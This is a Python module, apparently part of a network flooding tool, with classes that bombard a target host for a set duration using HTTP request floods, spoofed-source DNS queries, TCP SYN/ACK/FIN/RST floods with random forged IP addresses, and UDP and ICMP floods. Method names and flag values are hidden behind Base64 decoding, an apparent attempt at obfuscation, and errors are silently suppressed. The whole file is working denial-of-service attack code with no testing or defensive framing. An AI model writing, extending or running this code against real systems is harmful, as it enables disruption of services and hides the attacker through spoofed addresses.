import socket
import random
import string
import threading, time
from contextlib import suppress
from typing import Optional, Dict
from scapy.layers.dns import DNS, DNSQR
from datetime import datetime, timedelta
from scapy.all import IP, TCP, UDP, ICMP, send
from .utilities import NetworkUtilities, Endpoint
import base64

# Utility function to decode Base64 strings
def _decode_str(encoded: str) -> str:
    return base64.b64decode(encoded).decode("utf-8")

class L7:
    def __init__(self, endpoint, duration: int = 30):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)

    def _generate_data_content(self, length: int = 256) -> str:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def send_tcp_request(
        self,
        method: str = _decode_str("R0VU"),
        headers: Optional[Dict[str, str]] = None,
        body: str = "",
        body_len: int = 256,
        random_ip: str = None,
    ) -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                if random_ip:
                    s.bind((random_ip, 0))
                s.connect((self.endpoint.host, self.endpoint.port))

                body = self._generate_data_content(body_len)
                req: bytes = self.net_tools.build_request(self.endpoint, method, body)

                if headers:
                    header_lines = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
                    header_section = headers.encode() if isinstance(headers, bytes) else header_lines.encode()
                    req_parts = req.split(b"\r\n\r\n", 1)
                    if len(req_parts) == 2:
                            req = req_parts[0] + b"\r\n" + header_section + b"\r\n\r\n" + req_parts[1]
                    else:
                        req += header_section + b"\r\n\r\n"
                s.sendall(req)
                s.recv(4096)

    def GET(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, random_ip: str = None) -> None:
        self.send_tcp_request(_decode_str("R0VU"), headers, body, body_len, random_ip)

    def POST(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, random_ip: str = None) -> None:
        self.send_tcp_request(_decode_str("UE9TVA=="), headers, body, body_len, random_ip)

    def HEAD(self, headers: Optional[Dict[str, str]] = None, random_ip: str = None) -> None:
        self.send_tcp_request(_decode_str("SEVBRA=="), headers, random_ip=random_ip)

    def PUT(self, headers: Optional[Dict[str, str]] = None, body: str = "", body_len: int = 256, random_ip: str = None) -> None:
        self.send_tcp_request(_decode_str("UFVU"), headers, body, body_len, random_ip)

    def DELETE(self, headers: Optional[Dict[str, str]] = None, random_ip: str = None) -> None:
        self.send_tcp_request(_decode_str("REVMRVRF"), headers, random_ip=random_ip)

    def DNS(self, random_ip: str, domain: str = _decode_str("Z29vZ2xlLmNvbQ=="), qtype: str = _decode_str("QQ==")) -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                send(
                    IP(src=random_ip, dst=self.endpoint.host) /
                    UDP(sport=random.randint(1024, 65535), dport=self.endpoint.port) /
                    DNS(rd=1, qd=DNSQR(qname=domain, qtype=qtype)),
                    verbose=0
                )

class L4:
    def __init__(self, endpoint, duration: int):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)

    def _send_tcp_flag(self, flags: str, random_ip: str = None) -> None:
        while (self.until - datetime.now()).total_seconds() > 0:
            src_ip = random_ip or self.net_tools.create_random_ip()
            send(
                IP(src=src_ip, dst=self.endpoint.host) /
                TCP(
                    sport=random.randint(1024, 65535),
                    dport=self.endpoint.port,
                    flags=flags,
                    seq=random.randint(0, 0xFFFFFFFF)
                ),
                verbose=0
            )
            time.sleep(0.01)  # Rate control

    def ACK(self, random_ip: str = None) -> None:
        self._send_tcp_flag(_decode_str("QQ=="), random_ip)

    def SYN(self, random_ip: str = None) -> None:
        self._send_tcp_flag(_decode_str("Uw=="), random_ip)

    def FIN(self, random_ip: str = None) -> None:
        self._send_tcp_flag(_decode_str("Rg=="), random_ip)

    def RST(self, random_ip: str = None) -> None:
        self._send_tcp_flag(_decode_str("Ug=="), random_ip)

    def TCP(self, random_ip: str = None) -> None:
        self._send_tcp_flag(_decode_str("Uw=="), random_ip)  # Default to SYN for generic TCP

    def UDP(self, message: bytes = _decode_str("aGVsbG8=").encode(), random_ip: str = None) -> None:
        with suppress(Exception):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(10)
            if random_ip:
                s.bind((random_ip, 0))
            while (self.until - datetime.now()).total_seconds() > 0:
                s.sendto(message, (self.endpoint.host, self.endpoint.port))
                time.sleep(0.01)  # Rate control
            s.close()

class L3:
    def __init__(self, endpoint, duration: int):
        self.endpoint = endpoint
        self.net_tools: NetworkUtilities = NetworkUtilities()
        self.until = datetime.now() + timedelta(seconds=duration)

    def ICMP(self, data_content: bytes = _decode_str("cGF5bG9hZA==").encode(), random_ip: str = None) -> None:
        with suppress(Exception):
            while (self.until - datetime.now()).total_seconds() > 0:
                src_ip = random_ip or self.net_tools.create_random_ip()
                send(
                    IP(src=src_ip, dst=self.endpoint.host) /
                    ICMP() /
                    data_content,
                    verbose=0
                )
                time.sleep(0.01)  # Rate control